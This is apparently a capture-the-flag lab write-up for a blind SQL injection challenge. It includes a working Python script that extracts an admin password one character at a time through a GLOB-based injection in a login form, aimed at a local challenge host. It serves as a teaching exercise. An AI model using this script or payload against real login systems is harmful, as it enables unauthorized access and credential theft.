## ✅ what i did  
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
table=user, columns=username, password
admin - [flag]
guest - password
POST -> username&password
query=SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
if the login is successful the webpage doesn't print the flag
this is a blind sequel injection
the goal is to query the database and verify its reply (true->login successful or false->login failed)
i used GLOB bc its case sensitive since the flag has both capital and non-capital letters
-ran: '/challenge/server'
-ran: 'vim bro'
-typed:

#!/usr/bin/env python3
import requests
import string
from pwn import *
from bs4 import BeautifulSoup

context.log_level = 'error'

url = "http://challenge.localhost:80/"

headers = {
    "Host" : "challenge.localhost"
}

charset = string.ascii_letters + string.digits + "{_-.}"

flag = ""
while True:
    for c in charset:
        payload = flag + c
        data = {
            "username" : "admin",
            "password" : f"1' OR (password GLOB '{payload}*') AND password != 'password' --"
        }

        r = requests.post(url, headers=headers, data=data)
        if "admin" in r.text:
            flag += c
            print(f"{flag}", end="\r", flush=True)
            done = c
            if c == "}":
                print()
                exit()
            break


## 🧑🏾‍🏫 what this challenge teaches u
how to perform a Blind SQLi
this challenge is super useful
it helps u to understand how to automate script since in this case its almost impossible to retrieve the flag manually
i defined a charset fulfilled with capital + non-capital letters + digits + {}-_.
i iterated to each char in charset requests using it as payload untill i found the right one
if the payload is right the webserver redirects me to the webpage
once this happens, i concatenated the right payload to the flag im building
im done once the last char is }
